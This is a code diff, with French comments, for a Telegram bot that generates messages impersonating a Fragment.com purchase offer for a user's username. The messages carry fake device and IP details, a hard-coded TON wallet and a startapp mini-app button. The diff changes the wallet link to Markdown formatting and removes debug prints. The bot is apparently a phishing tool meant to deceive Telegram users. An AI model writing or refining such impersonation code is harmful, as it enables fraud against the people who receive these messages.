@@ -65,7 +65,7 @@ def generate_fragment_message(username, ton_amount):
     # Adresse wallet
     wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
     
-    # Message Fragment - IDENTIQUE au bot original
+    # Message Fragment avec format markdown plus simple
     fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
@@ -76,13 +76,13 @@ Please note that a 5% commission is charged to the seller prior to accepting the
 Additional Information:
 • Device: Safari on macOS  
 • IP Address: 103.56.72.245
-• Wallet: {wallet_address}
+• Wallet: [{wallet_address}](https://tonviewer.com/{wallet_address})
 
 Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
     
-    # Création des entités pour le formatage
+    # Création des entités pour le formatage (sans wallet link complexe)
     entities = []
     
     # 1. Offer Amount en gras
@@ -125,24 +125,7 @@ Important:
             length=len(important_text2)
         ))
     
-    # 5. Wallet cliquable - SOLUTION: recherche directe de l'adresse complète
-    wallet_start = fragment_message.find(wallet_address)
-    if wallet_start != -1:
-        # Debug détaillé
-        print(f"📍 Debug wallet:")
-        print(f"   - Adresse trouvée à la position: {wallet_start}")
-        print(f"   - Longueur adresse: {len(wallet_address)}")
-        print(f"   - Caractères avant: '{fragment_message[wallet_start-5:wallet_start]}'")
-        print(f"   - Adresse: '{fragment_message[wallet_start:wallet_start+len(wallet_address)]}'")
-        print(f"   - Caractères après: '{fragment_message[wallet_start+len(wallet_address):wallet_start+len(wallet_address)+5]}'")
-        
-        entities.append(MessageEntity(
-            type=MessageEntity.TEXT_LINK,
-            offset=wallet_start,
-            length=len(wallet_address),
-            url=f"https://tonviewer.com/{wallet_address}"
-        ))
-        print(f"✅ Wallet link créé: position {wallet_start}, longueur {len(wallet_address)}")
+    print(f"✅ Message généré avec format markdown pour le wallet")
     
     # 📱 BOUTON STARTAPP - Génère un lien t.me avec startapp
     startapp_param = f"{username}-{price:g}"
@@ -206,7 +189,8 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 input_message_content=InputTextMessageContent(
                     fragment_message,
                     entities=entities,
-                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
+                    parse_mode='Markdown',  # ✅ ACTIVE LE MARKDOWN POUR LES LIENS
+                    disable_web_page_preview=True
                 ),
                 reply_markup=keyboard
             )
